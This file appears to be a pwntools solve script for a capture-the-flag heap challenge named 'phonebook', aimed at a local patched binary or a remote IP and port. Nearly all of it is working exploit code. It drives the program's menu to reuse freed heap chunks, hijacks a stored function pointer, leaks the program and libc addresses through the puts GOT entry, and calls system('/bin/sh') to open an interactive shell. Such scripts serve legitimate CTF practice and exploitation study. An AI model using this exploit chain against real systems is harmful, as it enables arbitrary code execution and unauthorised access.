#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import ctypes
import struct
import logging
import os

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
lib = ELF('libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
# binary = context.binary = ELF('phonebook')
binary = context.binary = ELF('phonebook.patched')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    if binary.path.endswith('.patched'):
        env['LD_LIBRARY_PATH'] = os.getcwd()

    # forcing output to be unbuffered here
    p = process(binary.path, env=env, stdin=process.PTY, stdout=process.PTY)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('51.124.222.205', 13380)


class MallocChunk(ctypes.Structure):
    _fields_ = [("mchunk_prev_size", ctypes.c_size_t),
                ("mchunk_size", ctypes.c_size_t),
                ("fd", ctypes.c_void_p),
                ("bk", ctypes.c_void_p),
                ("fd_nextsize", ctypes.c_void_p),
                ("bk_nextsize", ctypes.c_void_p)]


# struct person {
#     uchar phone_number[8];
#     undefined8 func;
#     void * name;
#     int string_length;
# };

# struct person people[2];
# call __malloc_usable_size(((void*[2])people)[0])
# malloc_usable_size(person) == 0x28 (40)
# sizeof(person) == 0x20 (32)
sizeof_person = 0x20

name_len_1 = 0x10
name_len_2 = sizeof_person
name_len_3 = sizeof_person + 0x10
payload = b''
# create people[0]
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b': ', str(name_len_1).encode())  # namelen
p.sendlineafter(b': ', b'A'*(name_len_1-1))
p.sendlineafter(b': ', b'7'*7)
p.sendlineafter(b': ', b'3')

# alloc hidden message 0x25 to prevent consolidation
p.sendlineafter(b'> ', b'5')
p.sendlineafter(b': ', b'C')

# edit name[0]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_2).encode())
p.sendlineafter(b': ', b'D'*(name_len_2-1))

# alloc hidden message 0x25 to prevent consolidation
p.sendlineafter(b'> ', b'5')
p.sendlineafter(b': ', b'C')

# edit name[0] to switch name back to previous _ptr
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_1).encode())
p.sendlineafter(b': ', b'H'*(name_len_1-1))

# edit name[0] to alloc another larger chunk
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_3).encode())
p.sendlineafter(b': ', b'G'*(name_len_3-1))

# edit name[0] to switch name back to previous _ptr to add a fd ptr
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_1).encode())
p.sendlineafter(b': ', b'H'*(name_len_1-1))

# create people[1]
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'1')  # person
p.sendlineafter(b': ', b'40')  # namelen
p.sendlineafter(b': ', b'B'*32)
p.sendlineafter(b': ', b'7'*7)  # phone number
p.sendlineafter(b': ', b'1')  # relation

# delete people[1]
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', b'1')

# fill in puts got entry
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'1')


# edit name[0] to switch name back to name_len 2
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_2).encode())
p.sendlineafter(b': ', b'F')

# edit phone number [0]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7'*8)

# edit relation[0] to fix corruption
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'3')  # relation
p.sendlineafter(b'> ', b'3')  # love_call

# leak function pointer
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')  # person
p.recvuntil(b'Calling... ')
leak_raw = p.recvuntil(b'How')
leak_raw = leak_raw[8:]
leak = u64(leak_raw[:leak_raw.find(b'\nHow')].ljust(8, b'\x00'))
binary.address = leak - binary.sym['love_call']


# edit relation to fix corruption[0]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'1')


# edit phone number [0] to restart main
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'2')  # phone number
p.sendlineafter(b': ', b'7'*8)

# call func [0] to return to main - reset in use array
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')  # person

# edit relation to fix corruption[0]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'1')


payload = flat({
    0: b'X'*8,
    8: [
        binary.sym['love_call'],
        binary.sym['got.puts']
       ]

})
# edit name[0] to switch name back to name_len 2 and add a payload[1]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_2).encode())
p.sendlineafter(b': ', payload)


# edit relation to fix corruption[1]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'1')  # person
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'1')

# call [1] payload+8
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'1')
a = p.recvuntil(b'hang out!')
libc_leak = u64(a[a.find(b'Hey ')+len(b'Hey '):a.find(b"Let's")].ljust(8, b'\x00'))

lib.address = libc_leak - lib.sym['puts']


payload = flat({
    0: b'/bin/sh\x00',
    8: [
        lib.sym['system'],
        binary.sym['got.puts']
       ]

})
# edit name[0] to switch name back to name_len 2 and add a payload[1]
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'0')  # person
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(name_len_2).encode())
p.sendlineafter(b': ', payload)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'1')  # person

p.interactive()



